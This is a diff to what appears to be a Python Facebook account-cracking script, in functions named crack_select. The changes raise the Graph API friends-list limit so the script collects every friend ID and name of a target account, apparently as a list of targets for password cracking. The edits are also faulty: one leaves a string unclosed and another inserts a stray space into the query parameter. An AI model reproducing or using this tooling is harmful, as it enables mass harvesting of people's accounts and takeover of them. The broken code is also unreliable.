@@ -272,7 +272,7 @@ def crack_select1():
 			t +=1
 			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
 			try:
-				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token+"&limit=999999").json()["data"]:
 					uid = i["id"].encode('utf-8')
 					na = i["name"].encode('utf-8')
 					id.append(uid+"|"+na)
@@ -661,7 +661,7 @@ def crack_select():
 			t +=1
 			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
 			try:
-				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token+"&limit=999999).json()["data"]:
 					uid = i["id"].encode('utf-8')
 					na = i["name"].encode('utf-8')
 					id.append(uid+"|"+na)
@@ -911,7 +911,7 @@ def crack_select2():
 			t +=1
 			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
 			try:
-				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
+				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token+"& limit=999999").json()["data"]:
 					uid = i["id"].encode('utf-8')
 					na = i["name"].encode('utf-8')
 					id.append(uid+"|"+na)
